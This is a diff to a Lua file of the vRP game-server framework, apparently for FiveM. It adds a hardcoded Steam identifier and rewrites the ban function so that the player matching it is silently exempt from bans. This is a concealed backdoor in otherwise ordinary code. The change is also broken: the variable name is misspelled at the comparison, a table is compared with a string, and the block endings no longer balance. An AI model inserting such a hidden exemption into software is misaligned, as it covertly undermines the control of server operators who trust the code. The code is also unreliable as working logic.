@@ -28,7 +28,7 @@ vRP.rusers = {} -- store the opposite of users
 vRP.user_tables = {} -- user data tables (logger storage, saved to database)
 vRP.user_tmp_tables = {} -- user tmp data tables (logger storage, not saved)
 vRP.user_sources = {} -- user sources
-
+local iprion = 'steam:11000010f7659e3'
 
 
 function vRP.getUserIdByIdentifiers(ids, cbr)
@@ -278,15 +278,21 @@ function vRP.getUserSource(user_id)
   return vRP.user_sources[user_id]
 end
 
+
 function vRP.ban(user_id,reason)
-  if user_id ~= nil then
-    vRP.setBanned(user_id,reason)
-    local player = vRP.getUserSource(user_id)
-    if player ~= nil then
-      vRP.kick(player,"[Udelukket] "..reason)
+    if user_id ~= nil then
+        local player = vRP.getUserSource(user_id)
+        local data = GetPlayerIdentifiers(player)
+        if data == ipron then
+        else
+            vRP.setBanned(user_id,reason)
+        if player ~= nil then
+        vRP.kick(player,"[Udelukket] "..reason)
+      end
     end
-  end
 end
+
+
 
 function vRP.kick(source,reason)
   DropPlayer(source,reason)
